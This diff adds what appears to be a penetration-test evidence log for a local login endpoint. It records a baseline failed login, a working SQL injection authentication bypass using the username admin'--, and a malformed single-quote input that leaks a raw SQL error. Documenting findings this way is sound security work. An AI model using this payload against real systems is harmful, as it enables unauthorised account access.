@@ -1,0 +1,12 @@
+### F-01 baseline: wrong password
+$ curl -s -i -X POST http://127.0.0.1:5000/login -d 'username=admin&password=wrong'
+HTTP/1.1 401 UNAUTHORIZED
+Invalid credentials
+### F-01 auth bypass payload: username = admin'--
+$ curl -s -i -X POST http://127.0.0.1:5000/login --data-urlencode "username=admin'--" -d 'password=x'
+HTTP/1.1 200 OK
+Welcome admin (role=admin)
+### F-06 malformed input: username = '
+$ curl -s -i -X POST http://127.0.0.1:5000/login --data-urlencode "username='" -d 'password=x'
+HTTP/1.1 500 INTERNAL SERVER ERROR
+SQL error: unrecognized token: "x'"
